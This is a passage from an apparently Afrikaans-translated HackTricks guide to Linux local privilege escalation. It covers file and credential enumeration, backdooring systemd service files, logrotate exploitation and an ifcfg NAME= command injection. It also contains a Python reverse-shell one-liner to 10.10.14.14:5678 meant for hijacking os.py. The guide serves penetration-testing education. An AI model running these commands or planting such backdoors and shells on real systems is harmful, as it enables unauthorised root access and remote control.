for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, as die masjien 'n **tomcat** bediener uitvoer en jy kan **die Tomcat dienskonfigurasielêer binne /etc/systemd/,** wysig, dan kan jy die lyne wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou backdoor sal uitgevoer word die volgende keer dat tomcat gestart word.

### Kontroleer gidse

Die volgende gidse kan backups of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie die laaste een kan lees nie, maar probeer dit)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Vreemde ligging/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in die laaste minute
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Verborge lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web-lêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteunkopieë**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek na **verskeie moontlike lêers wat wagwoorde kan bevat**.\
**Nog 'n interessante hulpmiddel** wat jy kan gebruik hiervoor is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat 'n open source-toepassing is wat gebruik word om baie wagwoorde wat op 'n plaaslike rekenaar vir Windows, Linux & Mac gestoor is, te herstel.

### Logs

As jy logs kan lees, kan jy dalk **interessante/vertroulike inligting daarin** vind. Hoe vreemder die log is, hoe interessanter sal dit waarskynlik wees (waarskynlik).\
Ook kan sommige "**sleg**" geconfigureerde (backdoored?) **audit logs** jou toelaat om wagwoorde binne audit logs op te teken soos in hierdie plasing verduidelik: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om logs te kan lees, sal die groep [**adm**](interesting-groups-linux-pe/index.html#adm-group) baie nuttig wees.

### Shell-lêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generiese Creds Search/Regex

Jy moet ook kyk vir lêers wat die woord "**password**" in hul **naam** of binne die **inhoud** bevat, en ook kyk vir IPs en e-posadresse in logs, of hashes regexps.\
Ek gaan nie hier lys hoe om al hierdie te doen nie maar as jy belangstel kan jy die laaste kontroles wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform nagaan.

## Skryfbare lêers

### Python library hijacking

As jy weet van **waar** 'n python script uitgevoer gaan word en jy **kan daarin skryf** in daardie gids of jy kan **python libraries wysig**, kan jy die OS library wysig en dit backdoor (as jy kan skryf waar python script uitgevoer gaan word, kopieer en plak die os.py library).

Om **backdoor die library** voeg net aan die einde van die os.py library die volgende reël by (verander IP en PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate-uitbuiting

'n Kwetsbaarheid in `logrotate` laat gebruikers met **write permissions** op 'n loglêer of op die ouer-gidse daarvan moontlik verhoogde bevoegdhede verkry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om ewekansige lêers uit te voer, veral in gidse soos _**/etc/bash_completion.d/**_. Dit is belangrik om toestemmings nie net in _/var/log_ na te gaan nie, maar ook in enige gids waar logrotasie toegepas word.

> [!TIP]
> Hierdie kwetsbaarheid raak `logrotate` weergawe `3.18.0` en ouer

Meer gedetaileerde inligting oor die kwetsbaarheid is op hierdie bladsy te vinde: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Jy kan hierdie kwesbaarheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).

Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** dus, wanneer jy vind dat jy logs kan verander, kyk wie daardie logs bestuur en kyk of jy bevoegdhede kan eskaleer deur die logs met symlinks te vervang.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Kwetsbaarheidsverwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

As, om watter rede ook al, 'n gebruiker in staat is om 'n `ifcf-<whatever>`-skrip na _/etc/sysconfig/network-scripts_ te **skryf** **of** 'n bestaande een te **wysig**, dan is jou **system is pwned**.

Network-skripte, byvoorbeeld _ifcg-eth0_, word gebruik vir netwerkverbindings. Hulle lyk presies soos .INI-lêers. Hulle word egter op Linux deur Network Manager (dispatcher.d) ~sourced~.

In my geval word die `NAME=`-attribuut in hierdie netwerk-skripte nie korrek hanteer nie. **As daar 'n wit/leë spasie in die naam is, probeer die stelsel die deel ná die wit/leë spasie uitvoer**. Dit beteken dat **alles ná die eerste leë spasie as root uitgevoer word**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Let op die leë spasie tussen Network en /bin/id_)

### **init, init.d, systemd, en rc.d**

Die gids `/etc/init.d` huisves **scripts** vir System V init (SysVinit), die **klassieke Linux service management stelsel**. Dit sluit scripts in om `start`, `stop`, `restart`, en soms `reload` services te doen. Hierdie kan direk uitgevoer word of deur simboliese skakels gevind in `/etc/rc?.d/`. 'n Alternatiewe pad in Redhat-stelsels is `/etc/rc.d/init.d`.

Aan die ander kant is `/etc/init` geassosieer met **Upstart**, 'n nuwer **service management** wat deur Ubuntu ingevoer is, en gebruik konfigurasielêers vir servicebestuurs take. Ten spyte van die oorgang na Upstart, word SysVinit-skripte steeds langs Upstart-konfigurasies gebruik weens 'n kompatibiliteitslaag in Upstart.

**systemd** treeg na vore as 'n moderne initialisasie- en servicebestuurder, wat gevorderde funksies bied soos on-demand daemon-opstart, automount-bestuur, en stelseltoestand-snapshots. Dit organiseer lêers in `/usr/lib/systemd/` vir distributie-pakkette en `/etc/systemd/system/` vir administrateur-wysigings, wat stelseladministrasie vereenvoudig.

## Ander Wenke

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ontsnap uit beperkte Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hook gewoonlik 'n syscall om bevoorregte kernel-funksionaliteit aan 'n userspace manager bloot te stel. Swakke manager-verifikasie (bv. signature checks gebaseer op FD-order of swak wagwoordskemas) kan 'n plaaslike app in staat stel om die manager te imiteer en op reeds-rooted toestelle na root op te skaal. Leer meer en sien uitbuitingbesonderhede hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gedrewe service discovery in VMware Tools/Aria Operations kan 'n binêre pad uit proses command lines onttrek en dit met -v uitvoer onder 'n bevoorregte konteks. Permissiewe patrone (bv. die gebruik van \S) kan aanvaller-gestelde listeners in beskryflike lokasies (bv. /tmp/httpd) pas, wat lei tot uitvoering as root (CWE-426 Untrusted Search Path).

Leer meer en sien 'n gegeneraliseerde patroon toepaslik op ander discovery/monitoring stacks hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel-sekuriteitsbeskerming

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Beste hulpmiddel om te soek na Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Verwysings

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
